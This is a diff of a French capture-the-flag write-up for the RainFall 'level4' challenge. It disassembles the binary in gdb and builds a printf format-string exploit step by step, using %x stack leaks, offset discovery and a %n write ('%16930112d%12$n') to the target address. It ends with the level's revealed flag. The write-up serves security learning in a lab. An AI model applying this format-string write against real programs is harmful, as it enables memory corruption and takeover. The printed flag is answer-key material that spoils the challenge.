@@ -5,26 +5,27 @@
 /_/\___/|___/\___/_/  /_/   
                             
                             
-On lance le binaire et on se rend compte qu'il duplique ce que l'on écrit sur l'entrée standard. 
+ 
 
-level4@RainFall:~$ ./level4
-AAAA
-AAAA
+>$  level4@RainFall:~$ ./level4
+    AAAA
+    AAAA
 
-Again …
+On lance le binaire et on se rend compte qu'il duplique ce que l'on écrit sur l'entrée standard. Again …
 
->$ (gdb) objdump -d level4
+>$  (gdb) objdump -d level4
 
 On peut voir que le <main> fait appel à une fonction <n>. On parcours <n> celle ci utilise la fonction fgets().
+
 L’utilisation de fgets() à la place de gets() complique la tâche de réalisation d’un buffer overflow : 
 
-“The gets() function cannot be used securely.  Because of its lack of bounds checking, and the inability for the 
-calling program to reliably determine the length of the next incoming line, the use of this function enables malicious 
-users to arbitrarily change a running program's functionality through a buffer overflow attack.  It is strongly suggested 
-that the fgets() function be used in all cases.”
+“N'utilisez jamais gets(). Comme il est impossible de savoir à l'avance combien de caractères seront lus par gets(), et comme celui-ci écrira tous les caractères
+lus, même s'ils débordent du tampon, cette fonction est extrèmement dangereuse à utiliser. On a déjà utilisé ce dysfonctionnement pour créer des trous de sécurité.
+Utilisez fgets() à la place.”
 
 char *fgets(char *restrict str, int size,FILE * restrict stream);
-____________________________________________________________________________________________________________________________
+
+____________________________________________________________________________________________________________________________________________________________________
 
 (gdb) disas n
 Dump of assembler code for function n:
@@ -40,7 +41,7 @@ Dump of assembler code for function n:
    0x0804847f <+40>:	lea    -0x208(%ebp),%eax
    0x08048485 <+46>:	mov    %eax,(%esp)              (5) push notre input en argument pour <p>
    0x08048488 <+49>:	call   0x8048444 <p>            (6) appel <p> 
-              ---------------------------------------------------------------------------------------------------------------
+              ------------------------------------------------------------------------------------------------------------------------------------------------------
               CALL <p> [(gdb) disas p]
               0x08048444 <+0>:	push   %ebp
               0x08048445 <+1>:	mov    %esp,%ebp
@@ -50,7 +51,7 @@ Dump of assembler code for function n:
               0x08048450 <+12>:	call   0x8048340 <printf@plt>    (9) appel printf qui nous affiche notre input
               0x08048455 <+17>:	leave
               0x08048456 <+18>:	ret
-              ----------------------------------------------------------------------------------------------------------------
+              ------------------------------------------------------------------------------------------------------------------------------------------------------
    0x0804848d <+54>:	mov    0x8049810,%eax            (10) eax qui devrait contenir le retour de printf (le														
                                                               nombres caractères affichés) est écrasé par 8049810 												
                                                               qui est une chaine vide
@@ -62,7 +63,7 @@ Dump of assembler code for function n:
    0x080484a6 <+79>:	ret
 
 End of assembler dump.
-______________________________________________________________________________________________________________________________
+___________________________________________________________________________________________________________________________________________________________________
 
 La question est donc : comment réécrire le contenu de 0x8049810 avec “0x1025544” ?
 
@@ -70,6 +71,7 @@ On peut remarquer la présence de printf() qui est une source importantes d'expl
 
 Afin de mener à bien cet exploit. Il nous faut :
  
+    
     
     1. Lire dans la memoire
 
@@ -81,13 +83,16 @@ AAAA200
 
 printf() n’ayant aucun n’argument auquel référer “%x”, printf() nous affiche donc ce qu’il trouve sur la stack. 
 
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------   
+    
     
     2. Localiser le buffer de printf() dans la memoire
 
 Ajoutons progressivement des format specifier “%x” :
 
-level4@RainFall:~$ python -c "print 'AAAA %x %x %x %x'" | ./level4
-AAAA 200 b7fd1ac0 b7ff37d0 41414141
+level4@RainFall:~$ python -c 'print "AAAA %x %x %x %x"' | ./level4
+AAAA 200 b7fd1ac0 b7ff37d0 0
 
 Encore ...
 
@@ -99,10 +104,13 @@ On retrouve notre buffer “41414141”.
 level4@RainFall:~$ python -c 'print "AAAA %12$x"' | ./level4
 AAAA 41414141
 
-On peut aussi préciser explicitement quel argument prendre, en écrivant, à chaque conversion, « %p$ » […] l’entier 
-décimal p indique la position dans la liste d'arguments (ici notre stack).
+On peut aussi préciser explicitement quel argument prendre, en écrivant, à chaque conversion, « %m$ » […] l’ entier décimal m indique la position dans la liste
+d'arguments (ici notre stack).
 
-    
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
     3.  Injectez notre adresse 0x8049810 dans le buffer de printf()
 
 level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%x %x %x %x %x %x %x %x %x %x %x %x"' | ./level4
@@ -115,35 +123,35 @@ level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%12$x"' | ./level4
 
 Success ! On retrouve bien 8049810 à la position “%12$x”
 
-    
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
     4. Ecrire dans 8049810
 
 Nous allons utiliser le format specifier “%n“ qui saisis le nombre de caractères qui ont été écrits avec succès avant l’occurence 
 de “%n” dans le flux ou la mémoire tampon. Cette valeur est stockée dans l'entier dont l'adresse est donnée en argument. Or l’argument 
 ici est situé à une position que nous avons déterminée (2) et remplacée par l’adresse souhaitée “0x8049810” (3). 
 
-Il nous faut donc (0x1025544) 16930116 caractères avant “%n” afin de passer la comparaison
+Il nous faut donc (0x1025544) 16930116 caractères avant “%n” afin de passer la comparaison : 0x080484df <+59>:	cmp    $0x1025544,%eax	
 
-0x080484df <+59>:	cmp    $0x1025544,%eax	
-
-Il n'est pas possible de donner directement 16930116 caractères comme input en effet la limite du buffer de fgets nous en empeche
-
+Il n'est pas possible de donner directement 16930116 caractères comme input en effet la limite du buffer de fgets nous en empeche :
 THIS DOES NOT WORK -> level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + 16930112*"A"' | ./level4
 
 Cela dit si nous rajoutons un entier X entre le "%" et "d" du bien connu format specifier "%d" on obtiendra un padding d'X espace " ". 
 %Xd étant un format specifier l'input est interpreté au niveau de printf(). 
 
-%4d -> padding de 4 espaces
-%16930116d -> padding de 16930116 espaces ... ;)
+%4d         --> padding de 4 espaces
+%16930116d  --> padding de 16930116 espaces ... ;)
 
 On peut alors monter l'exploit suivante :
 
-level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4
-...
-...
-...
-...
-0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+>$  level4@RainFall:~$ python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4
+    ...
+    ...
+    ...
+    ...
+    0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 
 
 Next …
